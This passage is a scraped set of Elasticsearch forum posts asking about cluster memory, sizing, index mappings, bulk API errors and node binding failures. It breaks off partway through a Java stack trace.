would appreciate any assistance you can provide. For some context, I've run several commands this morning to looks for clues. I've copied the output of those commands below. Here's the output of the GET /_cat/indices?v command: health status index uuid pri rep docs.count docs.deleted store.size pri.store.size green open units2 AHcurH6cTASFSj4AF1q7rQ 2 0 14147313 1107187 1.8gb 1.8gb green open .kibana_2 _Uo50jEPQOK9iBGbh9zw4w 1 1 3.7kb green open places2 L0T_uvxZR8maIVwO3d44hw 2 1 6356 2570 45.7mb 19.6mb green open .kibana_1 OousjPfkSHeySiLefOdGOw 1 1 283b The output of GET /_cat/shards?v: index shard prirep state docs store ip node .kibana_2 0 p STARTED 1 3.7kb x.x.x.x 451a15942b572d7159f0736533a7533b .kibana_2 0 r STARTED 1 3.7kb x.x.x.x 7bcda2e106963bc7c4099a16d057b265 .kibana_1 0 r STARTED 0 283b x.x.x.x 66c9c69b225cb26bb1988e6427d529a8 .kibana_1 0 p STARTED 0 283b x.x.x.x 451a15942b572d7159f0736533a7533b places2 1 r STARTED 6405 12.8mb x.x.x.x 66c9c69b225cb26bb1988e6427d529a8 places2 1 p STARTED 6405 13.3mb x.x.x.x 451a15942b572d7159f0736533a7533b places2 0 p STARTED 6356 19.6mb x.x.x.x 66c9c69b225cb26bb1988e6427d529a8 places2 0 r STARTED 6356 13.3mb x.x.x.x 7bcda2e106963bc7c4099a16d057b265 units2 1 p STARTED 14353629 2.1gb x.x.x.x 451a15942b572d7159f0736533a7533b units2 0 p STARTED 14147313 1.8gb x.x.x.x 7bcda2e106963bc7c4099a16d057b265 The output of GET /_cluster/stats: { \"_nodes\" : { \"total\" : 6, \"successful\" : 6, \"failed\" : 0 }, \"cluster_name\" : \"843863714247:search-00\", \"cluster_uuid\" : \"z-d6Y0FwRXikLrOSwBlPxg\", \"timestamp\" : 1587481456218, \"status\" : \"green\", \"indices\" : { \"count\" : 4, \"shards\" : { \"total\" : 10, \"primaries\" : 6, \"replication\" : 0.6666666666666666, \"index\" : { \"shards\" : { \"min\" : 2, \"max\" : 4, \"avg\" : 2.5 }, \"primaries\" : { \"min\" : 1, \"max\" : 2, \"avg\" : 1.5 }, \"replication\" : { \"min\" : 0.0, \"max\" : 1.0, \"avg\" : 0.75 } } }, \"docs\" : { \"count\" : 28513707, \"deleted\" : 3754420 }, \"store\" : { \"size_in_bytes\" : 4137770567 }, \"fielddata\" : { \"memory_size_in_bytes\" : 18752, \"evictions\" : 0 }, \"query_cache\" : { \"memory_size_in_bytes\" : 1109584, \"total_count\" : 3410091, \"hit_count\" : 613985, \"miss_count\" : 2796106, \"cache_size\" : 65, \"cache_count\" : 36427, \"evictions\" : 36362 }, \"completion\" : { \"size_in_bytes\" : 0 }, \"segments\" : { \"count\" : 63, \"memory_in_bytes\" : 4344431, \"terms_memory_in_bytes\" : 1655163, \"stored_fields_memory_in_bytes\" : 1085760, \"term_vectors_memory_in_bytes\" : 0, \"norms_memory_in_bytes\" : 128576, \"points_memory_in_bytes\" : 867196, \"doc_values_memory_in_bytes\" : 607736, \"index_writer_memory_in_bytes\" : 0, \"version_map_memory_in_bytes\" : 0, \"fixed_bit_set_memory_in_bytes\" : 102640, \"max_unsafe_auto_id_timestamp\" : -1, \"file_sizes\" : { } } }, \"nodes\" : { \"count\" : { \"total\" : 6, \"coordinating_only\" : 0, \"data\" : 3, \"ingest\" : 3, \"master\" : 3 }, \"versions\" : [ \"7.4.2\" ], \"os\" : { \"available_processors\" : 12, \"allocated_processors\" : 12, \"names\" : [ { \"count\" : 6 } ], \"pretty_names\" : [ { \"count\" : 6 } ], \"mem\" : { \"total_in_bytes\" : 35828772864, \"free_in_bytes\" : 4621955072, \"used_in_bytes\" : 31206817792, \"free_percent\" : 13, \"used_percent\" : 87 } }, \"process\" : { \"cpu\" : { \"percent\" : 106 }, \"open_file_descriptors\" : { \"min\" : 1403, \"max\" : 1506, \"avg\" : 1445 } }, \"jvm\" : { \"max_uptime_in_millis\" : 2994403385, \"mem\" : { \"heap_used_in_bytes\" : 13192197672, \"heap_max_in_bytes\" : 19222757376 }, \"threads\" : 759 }, \"fs\" : { \"total_in_bytes\" : 656313581568, \"free_in_bytes\" : 644325363712, \"available_in_bytes\" : 644224700416 }, \"network_types\" : { \"transport_types\" : { \"com.amazon.opendistroforelasticsearch.security.ssl.http.netty.OpenDistroSecuritySSLNettyTransport\" : 6 }, \"http_types\" : { \"filter-jetty\" : 6 } }, \"discovery_types\" : { \"zen\" : 6 }, \"packaging_types\" : [ { \"flavor\" : \"oss\", \"type\" : \"tar\", \"count\" : 6 } ] } }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "026debf7-50a8-4670-85e0-68184c37650a",
    "url": "https://discuss.elastic.co/t/memory-usage-in-index/228549",
    "title": "Memory usage in index",
    "category": [
      "Elasticsearch"
    ],
    "author": "Rajeev_Bhat",
    "date": "April 17, 2020, 4:33pm April 18, 2020, 3:09am April 18, 2020, 3:10am April 18, 2020, 1:44pm April 18, 2020, 2:39pm April 18, 2020, 3:19pm April 18, 2020, 4:42pm April 19, 2020, 4:11pm April 19, 2020, 1:07am April 19, 2020, 4:07pm April 19, 2020, 5:54pm April 20, 2020, 2:49am April 20, 2020, 3:48am April 21, 2020, 1:38pm April 21, 2020, 2:02pm April 21, 2020, 2:08pm April 21, 2020, 2:11pm April 21, 2020, 2:18pm April 21, 2020, 2:19pm April 21, 2020, 2:26pm",
    "body": "Hello, I am new to ELasticSearch..I created an index and populated with around 500thousand documents. How can I check what % of my documents are in RAM and how much is stored in disk? Thanks Rajeev",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "aefb4b7f-8709-4b94-b00b-02da8603432c",
    "url": "https://discuss.elastic.co/t/advice-on-elasticsearch-kibana-project/229079",
    "title": "Advice on elasticsearch + kibana project",
    "category": [
      "Elasticsearch"
    ],
    "author": "cesar.hernandez.a3se",
    "date": "April 21, 2020, 3:15pm",
    "body": "Hi We are planning a new project for a customer; we need advice on our machine calculations, if they are realistic to hold all the data. This project consist on: Logstash receiving an average of 10.000 messages / second. These messages are some kind of network protocol, maximum 1500 bytes every packet. Every raw packet is processed, enriched and sent to elasticsearch. On elasticsearch, every document is 512 bytes size, aproximately (I assume 1024 bytes maximum). We have one index per day. Documents have to be stored, at least, during 3 months. There are only few queries / day (maximum 5000) Our guess for the server is: -7 nodes cluster elasticsearch: -disk: as we are storing 10.000 documents x second, this means 864.000.000 documents per day. Considering the maximum of 1kbyte per document, we need 823 GByte per day. We will have a 2 TB SSD disk to hold the daily data, and documents older than 1 day will be stored on a non-ssd 25 TB data disk. Considering a daily index, this index could be, maximum 1 TByte per day. As I know, every shard have a limit of ¿50 Gbyte?, so we will need, at least, 20 primary shards. Is that ok? About replicas, we are considering 6 replicas, as we have 7 nodes. Ok with that? The 7 nodes will be located in two different cps: 3 in one cpd, 4 in the other cpu: 32 cpu Intel(R) Xeon(R) CPU E5-2470 v2 @ 2.40GHz, every node ram: 128 GB RAM, every node Our 7 nodes , cpu and ram numbers are derived from another production environment, which has 3 nodes and have less ingest data than this will have. 2 node logstash with: disk: 100 GB no SSD cpu: 32 cpu Intel(R) Xeon(R) CPU E5-2470 v2 @ 2.40GHz ram: 128 GB RAM 1 node ha-proxy to balance incoming data to the two logstash servers. We need the two logstash servers as they will be in different cpds disk: 100 GB no SSD cpu: 8 cpu Intel(R) Xeon(R) CPU E5-2470 v2 @ 2.40GHz ram: 16 GB RAM What do you think about this? Thanks a lot",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c15d7421-0eb0-4101-abfb-e3da579e7307",
    "url": "https://discuss.elastic.co/t/elasticsearch-xpack-pki-realm-authentication-defaults-to-native-authentication/228906",
    "title": "ElasticSearch XPack - PKI Realm authentication defaults to native authentication",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 20, 2020, 5:08pm April 21, 2020, 2:36pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "58ab127c-df77-44d4-b7c8-31226c8c069c",
    "url": "https://discuss.elastic.co/t/elasticsearch-net-library-is-compatible-with-elasticsearh-7-5/229070",
    "title": "elasticsearch.Net library is compatible with elasticsearh 7.5?",
    "category": [
      "Elasticsearch"
    ],
    "author": "Jorge_Aragon",
    "date": "April 21, 2020, 2:31pm",
    "body": "with elastic 7.6 it works but with 7.5 it doesn't and I need 7.5",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f34fb826-2310-42de-a1b1-20d49ae897bf",
    "url": "https://discuss.elastic.co/t/new-index-from-existing-index/225231",
    "title": "New index from existing index",
    "category": [
      "Elasticsearch"
    ],
    "author": "SBH",
    "date": "March 26, 2020, 3:48pm March 26, 2020, 5:09pm March 27, 2020, 7:17am April 21, 2020, 9:24am April 21, 2020, 9:27am April 21, 2020, 2:13pm",
    "body": "Hi, Is it possible to create a new index in Elastic, from an existing index, fx if you want to flatten your index? Regards Søren",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "7617c9c1-d950-477a-b19a-2fdc9889eca7",
    "url": "https://discuss.elastic.co/t/nonodeavailableexception-error/228871",
    "title": "NoNodeAvailableException error",
    "category": [
      "Elasticsearch"
    ],
    "author": "Siddharth1010",
    "date": "April 20, 2020, 1:21pm April 20, 2020, 2:44pm April 20, 2020, 4:04pm April 20, 2020, 4:22pm April 21, 2020, 12:27pm April 21, 2020, 1:03pm April 21, 2020, 1:16pm April 21, 2020, 1:43pm",
    "body": "I am trying to save data in elasticsearch database through REST API using SpringBoot.I am using the following in my application.yml file data: elasticsearch: username: xxxxx password: xxxxx host: xxxxx node-name: xxxxx cluster-name: xxxx cluster-nodes: localhost:9300 client: transport: ignore_cluster_name: true I am keeping the Config File blank On running the project I am getting the following logs main org.elasticsearch.client.transport.TransportClientNodesService - {} - node {#transport#-1}{m-Y19jlaSfOhQNkqjzzDaw}{localhost}{127.0.0.1:9300} not part of the cluster Cluster [xxxxxx], ignoring... [2020-04-20 18:42:14,881] ERROR failed to load elasticsearch nodes : org.elasticsearch.client.transport.NoNodeAvailableException: None of the configured nodes are available: [{#transport#-1}{m-Y19jlaSfOhQNkqjzzDaw}{localhost}{127.0.0.1:9300}] (org.springframework.data.elasticsearch.repository.support.AbstractElasticsearchRepository:91) [INFO] 2020-04-20 18:42:15,476 main org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor - {} - Initializing ExecutorService 'applicationTaskExecutor' Apr 20, 2020 6:42:16 PM org.apache.coyote.AbstractProtocol start INFO: Starting ProtocolHandler [\"http-nio-8080\"] [INFO] 2020-04-20 18:42:16,094 main org.springframework.boot.web.embedded.tomcat.TomcatWebServer - {} - Tomcat started on port(s): 8080 (http) with context path '' [INFO] 2020-04-20 18:42:16,098 main com.target.ejtricklearchiverks.Main - {} - Started Main in 5.014 seconds (JVM running for 5.708) [WARN] 2020-04-20 18:42:19,475 elasticsearch[_client_][generic][T#2] org.elasticsearch.client.transport.TransportClientNodesService - {} - node {#transport#-1}{m-Y19jlaSfOhQNkqjzzDaw}{localhost}{127.0.0.1:9300} not part of the cluster Cluster [xxxxxxx], ignoring... [WARN] 2020-04-20 18:42:24,496 elasticsearch[_client_][generic][T#1] org.elasticsearch.client.transport.TransportClientNodesService - {} - node {#transport#-1}{m-Y19jlaSfOhQNkqjzzDaw}{localhost}{127.0.0.1:9300} not part of the cluster Cluster [xxxxxxx], ignoring... Can anyone please help with this error",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "617844b6-b184-4772-989d-4ba49691e127",
    "url": "https://discuss.elastic.co/t/create-a-visual-traffic-light-visual-by-aggregations/229047",
    "title": "Create a visual traffic light visual by aggregations",
    "category": [
      "Elasticsearch"
    ],
    "author": "shaharzi",
    "date": "April 21, 2020, 1:18pm",
    "body": "hello, im trying to do a transaction completion traffic light visual, for that im trying to make a DSL query which should give me the total number for success and failed transactions. for example T1 includes 3 steps. A1,B1,C1, each step has a bit number which sum of all them gives a number. in that way i can knows what completes and what didn't. example: success - A1=100, B1 = 10, C1 = 1 , the sum of them gives me 111. fails i give 0 (zero) now if one of them less then 111 i know there was an issue. some ideas how to visual this? and how can i DSL it? thanks !",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "76786147-9533-46bb-9198-651724808823",
    "url": "https://discuss.elastic.co/t/object-field-aggregations-with-query/229039",
    "title": "Object field aggregations with query",
    "category": [
      "Elasticsearch"
    ],
    "author": "Ivan_Striukov",
    "date": "April 21, 2020, 12:51pm",
    "body": "I have following mapping in my index. \"description\" field it is an array of objects and i want to aggregate only one field of one object of this array. I trying to add query for parent aggregation but it doesn`t help. \"country\": { \"properties\": { \"deletion\": { \"type\": \"boolean\" }, \"deletionMark\": { \"type\": \"boolean\" }, \"description\": { \"properties\": { \"lang\": { \"type\": \"text\", \"fields\": { \"keyword\": { \"type\": \"keyword\", \"ignore_above\": 256 } } }, \"tittle\": { \"type\": \"text\", \"fields\": { \"keyword\": { \"type\": \"keyword\", \"ignore_above\": 256 } } } } }, \"id\": { \"type\": \"text\", \"fields\": { \"keyword\": { \"type\": \"keyword\", \"ignore_above\": 256 } } } } } Data what i have : \"country\": { \"id\": \"a8b84f31-2d49-11dd-8608-0018fe7ab965\", \"deletion\": false, \"deletionMark\": false, \"description\": [ { \"tittle\": \"China\", \"lang\": \"en\" }, { \"tittle\": \"Китай\", \"lang\": \"ru\" }, { \"tittle\": \"Китай\", \"lang\": \"uk\" } ] } My aggregation : { \"global\" : { }, \"aggregations\" : { \"and\" : { \"filter\" : { \"match\" : { \"country.description.lang.keyword\" : { \"query\" : \"uk\", \"operator\" : \"OR\", \"prefix_length\" : 0, \"max_expansions\" : 50, \"fuzzy_transpositions\" : true, \"lenient\" : false, \"zero_terms_query\" : \"NONE\", \"auto_generate_synonyms_phrase_query\" : true, \"boost\" : 1.0 } } }, \"aggregations\" : { \"6eb5efa6-affb-11e7-80cc-009c029ad4f0\" : { \"terms\" : { \"field\" : \"country.description.tittle.keyword\", \"size\" : 1000, \"min_doc_count\" : 1, \"shard_min_doc_count\" : 0, \"show_term_doc_count_error\" : false, \"order\" : [ { \"_count\" : \"desc\" }, { \"_key\" : \"asc\" } ] } } } } } } Aggregation which elastic return : { \"meta\" : { }, \"doc_count\" : 65039, \"and\" : { \"meta\" : { }, \"doc_count\" : 1, \"6eb5efa6-affb-11e7-80cc-009c029ad4f0\" : { \"doc_count_error_upper_bound\" : 0, \"sum_other_doc_count\" : 0, \"buckets\" : [ { \"key\" : \"China\", \"doc_count\" : 1 }, { \"key\" : \"Китай\", \"doc_count\" : 1 } ] } } } } What aggregation i want to receive : { \"meta\" : { }, \"doc_count\" : 65039, \"and\" : { \"meta\" : { }, \"doc_count\" : 1, \"6eb5efa6-affb-11e7-80cc-009c029ad4f0\" : { \"doc_count_error_upper_bound\" : 0, \"sum_other_doc_count\" : 0, \"buckets\" : [ { \"key\" : \"Китай\", \"doc_count\" : 1 } ] } } } } What i need to do for it? How i can filter object inside of aggregation?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f04e6e36-a055-4028-b403-6c5b5b5ed5f6",
    "url": "https://discuss.elastic.co/t/elasticsearch-6-8-6-bulk-api-does-not-recognize-parameter-include-type-name/228872",
    "title": "Elasticsearch 6.8.6 _bulk API does not recognize parameter include_type_name",
    "category": [
      "Elasticsearch"
    ],
    "author": "nverrill",
    "date": "April 20, 2020, 1:32pm April 20, 2020, 1:53pm April 20, 2020, 2:27pm April 20, 2020, 10:26pm April 20, 2020, 10:27pm April 21, 2020, 12:07pm",
    "body": "We have an application that can send _bulk requests to elasticsearch(I cannot modify what it sends), but is failing because the type is missing and it appears that [include_type_name] is not supported by the _bulk API. We are currently on Elasticsearch 6.8.6. Is this intended behavior? Request: POST /_bulk { \"index\" : { \"_index\" : \"test\", \"_id\" : \"1\" } } { \"field1\" : \"value1\" } Response: { \"error\": { \"root_cause\": [ { \"type\": \"action_request_validation_exception\", \"reason\": \"Validation Failed: 1: type is missing;\" } ], \"type\": \"action_request_validation_exception\", \"reason\": \"Validation Failed: 1: type is missing;\" }, \"status\": 400 } Request: POST /_bulk?include_type_name=false { \"index\" : { \"_index\" : \"test\", \"_id\" : \"1\" } } { \"field1\" : \"value1\" } Response: { \"error\": { \"root_cause\": [ { \"type\": \"illegal_argument_exception\", \"reason\": \"request [/_bulk] contains unrecognized parameter: [include_type_name]\" } ], \"type\": \"illegal_argument_exception\", \"reason\": \"request [/_bulk] contains unrecognized parameter: [include_type_name]\" }, \"status\": 400 }",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "00b1c789-f57d-424d-89e2-3e8f73a088c4",
    "url": "https://discuss.elastic.co/t/memory-usage-of-dedicated-master-nodes-are-too-high/228987",
    "title": "Memory usage of dedicated master-nodes are too high",
    "category": [
      "Elasticsearch"
    ],
    "author": "Ayush_Verma",
    "date": "April 21, 2020, 8:34am April 21, 2020, 8:29am April 21, 2020, 8:33am April 21, 2020, 8:36am April 21, 2020, 8:59am April 21, 2020, 9:21am April 21, 2020, 9:28am April 21, 2020, 10:11am April 21, 2020, 11:47am April 21, 2020, 11:49am",
    "body": "We have 3 dedicated master-nodes, 3 data-nodes and 2 ingest-nodes. version: 7.3 shards: 3 replica: 1 master nodes- 2vCPUs, 2 GM RAM (For all 3 nodes), data nodes- 4vCPUs, 16 GB RAM (For all 3 nodes), ingest nodes- 2vCPUs, 4 GB RAM (For all 2 nodes) xml for dedicated master node (Tell me if it is not configured properly) node.master: true node.data: false node.ingest: false do I need to set anything else for dedicated master node? Heap Memory for master nodes are 50% ie :- -Xms1g -Xmx1g But I read in one article that you can increase it to 75-80% for dedicated master nodes: https://discuss.elastic.co/t/master-node-gradually-moves-to-out-of-memory-exception/102344 Also in some other article I find out that setting more than 50% of heap memory is not a good practice: https://discuss.elastic.co/t/elasticsearch-master-node-having-high-memory-pressure/205079 Memory Usage of all 3 master nodes are nearly 80-85%, How can i reduce this. Thanks.",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "81a0e74e-9464-486a-a3ff-2741b4528958",
    "url": "https://discuss.elastic.co/t/exclusion-list-for-watcher/224953",
    "title": "Exclusion List for Watcher",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "March 25, 2020, 7:34am March 30, 2020, 1:49pm March 31, 2020, 9:36am March 31, 2020, 11:15am April 21, 2020, 11:11am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e73a59b1-a027-447f-bdfe-35d6a8c8ce7e",
    "url": "https://discuss.elastic.co/t/initial-contribution-to-elastic-search-is-all-java-versions-9-14-required-to-be-installed/228628",
    "title": "Initial Contribution to Elastic Search(Is all java versions 9-14 required to be installed)",
    "category": [
      "Elasticsearch"
    ],
    "author": "harsha549",
    "date": "April 18, 2020, 8:12am April 18, 2020, 9:30am April 21, 2020, 10:05am April 21, 2020, 10:25am",
    "body": "image897×273 21.7 KB I wanted to start contributing to elastic.So, do I need install all the java versions from Java 9 -14 ?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "96bcc32c-cd8d-47f5-bf07-f075c9ba9656",
    "url": "https://discuss.elastic.co/t/heap-usage-issue/224554",
    "title": "Heap usage issue",
    "category": [
      "Elasticsearch"
    ],
    "author": "YvorL",
    "date": "March 22, 2020, 11:42am March 22, 2020, 12:29pm March 22, 2020, 12:34pm March 22, 2020, 12:37pm March 22, 2020, 12:50pm March 23, 2020, 6:45pm March 24, 2020, 11:37am March 24, 2020, 11:47am March 24, 2020, 12:23pm March 31, 2020, 10:43am April 4, 2020, 11:44am April 4, 2020, 6:48pm April 6, 2020, 11:22am April 17, 2020, 1:16pm April 17, 2020, 2:33pm April 17, 2020, 2:57pm April 17, 2020, 4:13pm April 21, 2020, 9:32am",
    "body": "Hi! I've got an issue with one visualization. There's a high cardinality field (HCF) I need to check once in a while. My visualization (line chart) shows the TOP 10 instances by unique count. When I run it on the past hour, one of the nodes hits the heap memory limit (circuit breaker) and the shards on that node goes unassigned. image902×258 25.8 KB None of the other instances flinch at at all. When I do the same on another cluster the \"load\" seems to be distributed. The two clusters are running almost identical setup. The one with the issue described above is running on a newer env (OpenJDK 11). I can't put my finger on the problem here. Everything else runs smoothly, CPU utilization is between 20-30%, heap around 50%, average load around 1, no other visualizations, dashboards, complex aggreagations have similar effect on the cluster. Is there a way to prevent this behavior (10GB spike in heap)? Specs: ES version: 7.2.1 Cluster has 6 data nodes each with 55GB RAM/25GB heap 8 core (2.3 GHz) Index in question (at query time): 100M+ documents 10 shards (5 primary, 5 replica) size 73 GB+ unique instances ~20K HCF 500K+ unique values Thank you, YvorL",
    "website_area": "discuss",
    "replies": 18
  },
  {
    "id": "6cadcdc7-3eb2-4013-96ce-7c21b0d9f6d4",
    "url": "https://discuss.elastic.co/t/schedule-replica-shard-creation/228567",
    "title": "Schedule replica shard creation",
    "category": [
      "Elasticsearch"
    ],
    "author": "YvorL",
    "date": "April 17, 2020, 7:45pm April 21, 2020, 9:30am April 21, 2020, 9:30am",
    "body": "Hi! Is there any way to schedule the creation of replica shards? I'd like to mitigate the performance impact of the replica shard creation during indexing and add replicas during the night.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "42702f38-b55b-4e39-aa73-bfbc90267331",
    "url": "https://discuss.elastic.co/t/getting-error-the-dims-property-must-be-specified-for-field-vector-despite-being-set-in-mapping/229001",
    "title": "Getting [ERROR] 'The [dims] property must be specified for field [vector].' despite being set in mapping",
    "category": [
      "Elasticsearch"
    ],
    "author": "Vinay_Sharma",
    "date": "April 21, 2020, 9:02am",
    "body": "I am trying to upload dense vectors to Elasticsearch endpoint. created index with mapping as below: mapping = { \"mappings\": { \"properties\" : { \"vector\": { \"type\": \"dense_vector\", \"dims\": 100 }, \"word\" : { \"type\" : \"text\" } } } } es.indices.create( index=\"test\", body=mapping ) response received: {'acknowledged': True, 'shards_acknowledged': True, 'index': 'test'} created a function to upload vector using bulk api as below: Model is a python dictionary with word as key and associated vector as value. def gendata(model): for key, value in model.items(): key = str(key) yield { \"_index\": \"test\", \"_id\": key, \"_type\": \"document\", \"word\": key, \"vector\": value } getting below error while calling function gendata() using helpers.bulk() NOTE: dims are set in mapping then why it is giving error that dims must be specified. BulkIndexError: ('100 document(s) failed to index.', [{'index': {'_index': 'glove_vocabulary_100d', '_type': 'document', '_id': 'the', 'status': 400, 'error': {'type': 'mapper_parsing_exception', 'reason': 'The [dims] property must be specified for field [vector].'}, 'data': {'word': 'the', 'vector': [-0.038194, -0.24487, 0.72812, -0.39961, 0.083172, 0.043953, -0.39141, 0.3344, -0.57545, 0.087459, 0.28787, -0.06731, 0.30906, -0.26384, -0.13231, -0.20757, 0.33395, -0.33848, -0.31743, -0.48336, 0.1464, -0.37304, 0.34577, 0.052041, 0.44946, -0.46971, 0.02628, -0.54155, -0.15518, -0.14107, -0.039722, 0.28277, 0.14393, 0.23464, -0.31021, 0.086173, 0.20397, 0.52624, 0.17164, -0.082378, -0.71787, -0.41531, 0.20335, -0.12763, 0.41367, 0.55187, 0.57908, -0.33477, -0.36559, -0.54857, -0.062892, 0.26584, 0.30205, 0.99775, -0.80481, -3.0243, 0.01254, -0.36942, 2.2167, 0.72201, -0.24978, 0.92136, 0.034514, 0.46745, 1.1079, -0.19358, -0.074575, 0.23353, -0.052062, -0.22044, 0.057162, -0.15806, -0.30798, -0.41625, 0.37972, 0.15006, -0.53212, -0.2055, -1.2526, 0.071624, 0.70565, 0.49744, -0.42063, 0.26148, -1.538, -0.30223, -0.073438, -0.28312, 0.37104, -0.25217, 0.016215, -0.017099, -0.38984, 0.87424, -0.72569, -0.51058, -0.52028, -0.1459, 0.8278, 0.27062]}}}",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c57b9a5e-31a0-4359-9db2-a8556c8fe438",
    "url": "https://discuss.elastic.co/t/using-your-own-domain-cname-to-access-cloud-elastic-instance/142024",
    "title": "Using your own domain cname to access cloud elastic instance?",
    "category": [
      "Elasticsearch"
    ],
    "author": "agonzalez",
    "date": "July 28, 2018, 11:11am July 28, 2018, 11:29am August 25, 2018, 11:29am April 21, 2020, 8:34am",
    "body": "I am using cloud.elastic.co instance but it provides you long URL to access ES like XXXXXXXXXXXXXX.us-east-xx.aws.found.io I tried to set a DNS CNAME like \"es.mycompany.com\" to mask the name but then trying to access elasticsearch using my domain doesnt work. How is possible to use your own domain name with elastic cloud instance?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "778179fa-b120-4418-95cd-dabf07ae5f97",
    "url": "https://discuss.elastic.co/t/curl-call-by-external-ip/228982",
    "title": "Curl call by external IP",
    "category": [
      "Elasticsearch"
    ],
    "author": "Rajeev_Bhat",
    "date": "April 21, 2020, 7:40am April 21, 2020, 8:44am",
    "body": "Hello I tried the solution of this thread, How set up to listen on external IP AND localhost? Elasticsearch network.host: [ \"_local_\", \"a.b.c.d\" ] should work. See https://www.elastic.co/guide/en/elasticsearch/reference/5.6/modules-network.html But getting following error on starting elasticsearch: 2020-04-21T07:35:09,598][INFO ][o.e.x.s.a.s.FileRolesStore] [RogYx45] parsed [0] roles from file [/remote/users/bhatr/elasticsearch-6.8.8/config/roles.yml] [2020-04-21T07:35:10,443][INFO ][o.e.x.m.p.l.CppLogMessageHandler] [RogYx45] [controller/34384] [Main.cc@109] controller (64 bit): Version 6.8.8 (Build 398321ce7838fd) Copyright (c) 2020 Elasticsearch BV [2020-04-21T07:35:11,219][DEBUG][o.e.a.ActionModule ] [RogYx45] Using REST wrapper from plugin org.elasticsearch.xpack.security.Security [2020-04-21T07:35:11,606][INFO ][o.e.d.DiscoveryModule ] [RogYx45] using discovery type [zen] and host providers [settings] [2020-04-21T07:35:12,838][INFO ][o.e.n.Node ] [RogYx45] initialized [2020-04-21T07:35:12,838][INFO ][o.e.n.Node ] [RogYx45] starting ... [2020-04-21T07:35:13,331][WARN ][o.e.b.ElasticsearchUncaughtExceptionHandler] [RogYx45] uncaught exception in thread [main] org.elasticsearch.bootstrap.StartupException: BindTransportException[Failed to bind to [9300-9400]]; nested: BindException[Cannot assign requested address]; at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:163) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:150) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:86) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:124) ~[elasticsearch-cli-6.8.8.jar:6.8.8] at org.elasticsearch.cli.Command.main(Command.java:90) ~[elasticsearch-cli-6.8.8.jar:6.8.8] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:116) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:93) ~[elasticsearch-6.8.8.jar:6.8.8] Caused by: org.elasticsearch.transport.BindTransportException: Failed to bind to [9300-9400] at org.elasticsearch.transport.TcpTransport.bindToPort(TcpTransport.java:408) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.transport.TcpTransport.bindServer(TcpTransport.java:375) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.transport.netty4.Netty4Transport.doStart(Netty4Transport.java:136) ~[?:?] at org.elasticsearch.xpack.core.security.transport.netty4.SecurityNetty4Transport.doStart(SecurityNetty4Transport.java:127) ~[?:?] at org.elasticsearch.xpack.security.transport.netty4.SecurityNetty4ServerTransport.doStart(SecurityNetty4ServerTransport.java:46) ~[?:?] at org.elasticsearch.common.component.AbstractLifecycleComponent.start(AbstractLifecycleComponent.java:72) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.transport.TransportService.doStart(TransportService.java:227) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.common.component.AbstractLifecycleComponent.start(AbstractLifecycleComponent.java:72) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.node.Node.start(Node.java:741) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.bootstrap.Bootstrap.start(Bootstrap.java:269) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:342) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:159) ~[elasticsearch-6.8.8.jar:6.8.8] ... 6 more Caused by: java.net.BindException: Cannot assign requested address at sun.nio.ch.Net.bind0(Native Method) ~[?:?] at sun.nio.ch.Net.bind(Net.java:433) ~[?:?] at sun.nio.ch.Net.bind(Net.java:425) ~[?:?] at sun.nio.ch.ServerSocketChannelImpl.bind(ServerSocketChannelImpl.java:223) ~[?:?] at io.netty.channel.socket.nio.NioServerSocketChannel.doBind(NioServerSocketChannel.java:130) ~[?:?] at io.netty.channel.AbstractChannel$AbstractUnsafe.bind(AbstractChannel.java:562) ~[?:?] at io.netty.channel.DefaultChannelPipeline$HeadContext.bind(DefaultChannelPipeline.java:1358) ~[?:?] at io.netty.channel.AbstractChannelHandlerContext.invokeBind(AbstractChannelHandlerContext.java:501) ~[?:?] at io.netty.channel.AbstractChannelHandlerContext.bind(AbstractChannelHandlerContext.java:486) ~[?:?] at io.netty.channel.DefaultChannelPipeline.bind(DefaultChannelPipeline.java:1019) ~[?:?] at io.netty.channel.AbstractChannel.bind(AbstractChannel.java:258) ~[?:?] at io.netty.bootstrap.AbstractBootstrap$2.run(AbstractBootstrap.java:366) ~[?:?] at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:163) ~[?:?] at 